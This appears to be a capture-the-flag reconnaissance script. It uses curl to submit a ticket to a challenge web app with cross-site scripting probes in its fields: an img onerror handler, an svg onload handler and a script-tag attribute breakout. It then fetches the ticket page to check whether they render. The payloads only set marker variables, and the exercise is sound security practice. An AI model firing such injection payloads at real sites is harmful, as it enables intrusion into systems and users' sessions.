#!/bin/bash
HOST="6e197819-b3b8-423c-b184-ac91fd95fe81.red.cyberkent.uz"
DIR=~/ctf/web/marosim
cd "$DIR"
JAR=cookies.txt

echo "---submit ticket 2: test img/svg xss in body, attribute breakout in link, html in subject---"
curl -s -m 8 -b "$JAR" -c "$JAR" -X POST "http://$HOST/ticket" \
  --data-urlencode "subject=<b>SUBJ_TEST</b>" \
  --data-urlencode "body=<img src=x onerror=window.__m1=1>BODY2 <svg onload=window.__m2=1>END" \
  --data-urlencode "link=\"><script>window.__m3=1</script>" \
  --data-urlencode "attachment=plain" \
  -o submit2.html -w "HTTP:%{http_code}\n"
cat submit2.html
echo
ID=$(grep -oE '"id":[0-9]+' submit2.html | grep -oE '[0-9]+')
echo "new ticket id=$ID"

echo "---view ticket $ID---"
curl -s -m 8 -b "$JAR" -c "$JAR" "http://$HOST/ticket/$ID" -o "t$ID.html"
cat "t$ID.html"
